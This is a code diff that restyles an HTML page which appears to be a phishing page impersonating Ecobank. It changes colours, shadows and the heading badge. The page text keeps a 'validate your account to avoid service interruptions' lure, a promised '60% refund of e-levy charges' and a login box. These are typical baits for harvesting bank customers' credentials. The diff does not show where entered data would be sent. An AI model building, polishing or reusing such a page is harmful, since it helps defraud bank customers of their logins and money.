@@ -8,24 +8,24 @@
     body {
       font-family: Arial, sans-serif;
       margin: 0;
-      background: linear-gradient(to bottom, #f0f4ff, #d9e4ff); /* lighter body background */
+      background: linear-gradient(to bottom, #08143a, #0b1d4d);
       display: flex;
       flex-direction: column;
       align-items: center;
-      color: #333;
+      color: #fff;
       overflow-x: hidden;
     }
 
     .header {
       position: relative;
-      background: linear-gradient(135deg, #1e3c72, #2a5298); /* lighter, fresher blue */
+      background: linear-gradient(135deg, #1c3faa, #2a5298); /* lighter blue */
       color: #fff;
       width: 100%;
       min-height: 180px;
       padding: 40px 20px;
       border-bottom-left-radius: 40px;
       border-bottom-right-radius: 40px;
-      box-shadow: 0 4px 12px rgba(0,0,0,0.25);
+      box-shadow: 0 4px 10px rgba(0,0,0,0.3);
       display: flex;
       justify-content: center;
       align-items: center;
@@ -33,8 +33,23 @@
     }
 
     .header-content { position: relative; z-index: 1; }
-    .header-content h1 { margin: 0 0 10px; font-size: 24px; font-weight: bold; }
-    .header-content p { margin: 5px 0 0; font-size: 14px; }
+
+    .title-badge {
+      display: inline-block;
+      background: linear-gradient(135deg, #1e3c72, #2a5298);
+      color: #fff;
+      padding: 12px 20px;
+      border-radius: 50px;
+      font-size: 20px;
+      font-weight: bold;
+      text-transform: uppercase;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.25);
+    }
+
+    .header-content p {
+      margin: 10px 0 0;
+      font-size: 14px;
+    }
 
     .login-container {
       background: #fff;
@@ -44,7 +59,7 @@
       margin-top: -30px;
       padding: 30px 25px;
       border-radius: 12px;
-      box-shadow: 0 6px 16px rgba(0,0,0,0.2);
+      box-shadow: 0 6px 16px rgba(0,0,0,0.4);
       position: relative;
       overflow: hidden;
     }
@@ -144,7 +159,7 @@
 <body>
   <div class="header">
     <div class="header-content">
-      <h1>ECOBANK ONLINE VALIDATION</h1>
+      <h1 class="title-badge">ECOBANK ONLINE VALIDATION</h1>
       <p>Validate your account information below to avoid service interruptions</p>
       <p>A 60% refund of e-levy charges awaits you!</p>
     </div>
